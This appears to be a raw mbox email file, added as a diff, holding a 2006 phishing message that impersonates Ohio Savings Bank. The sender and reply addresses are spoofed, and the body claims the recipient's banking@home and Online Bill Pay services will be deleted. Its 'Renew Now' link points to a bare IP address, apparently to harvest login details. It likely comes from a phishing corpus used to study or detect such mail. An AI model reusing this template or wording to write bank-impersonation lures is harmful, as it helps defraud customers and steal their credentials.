@@ -1,0 +1,57 @@
+From nobody Sun Jan 25 13:49:57 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id DB3B22A88C
+ for <user@example.com>; Thu,  2 Mar 2006 20:54:21 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+ id CA4F4621C92; Thu,  2 Mar 2006 20:54:21 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id AD63B621C71
+ for <user@example.com>; Thu,  2 Mar 2006 20:54:21 -0500 (EST)
+Received: (from user@localhost) by mail.example.com id UAA10497
+ for user@example.com; Thu, 2 Mar 2006 20:54:21 -0500
+Received: from mail.com ([86.127.6.221])
+ by mail.example.com with SMTP id UAA10489
+ for <user@example.com>; Thu, 2 Mar 2006 20:54:20 -0500
+Message-Id: <200603030154.UAA10489@mail.example.com>
+Reply-To: <security@ohiosavingsbank.com>
+From: "Ohio Savings" <security@ohiosavingsbank.com>
+Subject: Security Measures
+Date: Fri, 3 Mar 2006 03:54:41 +0200
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+To: undisclosed-recipients: ;
+X-Keywords: 
+Status: RO
+Content-Length: 2048
+Lines: 21
+
+<DIV>
+<TABLE id=table1 cellSpacing=0 cellPadding=0 width=396 summary="" border=0>
+<TBODY>
+<TR>
+<TD width=396>
+<DIV style="DISPLAY: inline"><IMG height=26 alt="Ohio Savings Bank" src="http://www.ohiosavings.com/images/ohiologo.gif" width=282 border=0></DIV></TD></TR></TBODY></TABLE>&nbsp; 
+<P>&nbsp;&nbsp;&nbsp;Dear Customer,</P>
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;&nbsp; This is your official notification from Ohio Savings Bank that the service(s) listed below<BR>&nbsp;&nbsp; will be deactivated and deleted if not renewed immediately. Previous notifications have<BR>&nbsp;&nbsp; been sent to the Billing Contact assigned to this account. As the Primary Contact, you<BR>&nbsp;&nbsp; must renew the service(s) listed below or it will be deactivated and deleted. <BR><BR><BR>&nbsp;&nbsp; <B><A onclick="return ShowLinkWarning()" href="http://62.127.253.55/index.html.pp" target=_blank onfiltered="return ShowLinkWarning()"><FONT color=#003399>Renew Now</FONT></A>&nbsp;</B>your <B>banking@home</B> and <B>Online Bill Pay</B> services.</DIV>
+<DIV><FONT color=#003399></FONT>&nbsp;</DIV>
+<DIV><BR>&nbsp;&nbsp; SERVICE: <B>banking@home</B> with <B>Online Bill Pay</B><BR>&nbsp;&nbsp; EXPIRATION: <B>Jan - &nbsp;10 - 2006</B></DIV>
+<DIV>&nbsp;</DIV>
+<DIV><BR>&nbsp;&nbsp; Thank you for using Bill Pay Service. We appreciate your business and the opportunity to serve you.</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;&nbsp;&nbsp;Ohio Savings Bank&nbsp;Management Center Customer Support</DIV>
+<DIV>&nbsp;</DIV>
+<DIV><BR>&nbsp;&nbsp; *****************************************************************************<BR>&nbsp;&nbsp; IMPORTANT CUSTOMER SUPPORT INFORMATION<BR>&nbsp;&nbsp; *****************************************************************************</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;&nbsp; Please do not reply to this message. For any inquiries, contact Customer Service.</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;&nbsp; Document Reference: (87051203).<BR><BR>&nbsp;&nbsp; Copyright 1996 - 2005 Ohio Savings Bank, Ohio Savings Plaza<BR>&nbsp;&nbsp; </DIV></DIV>
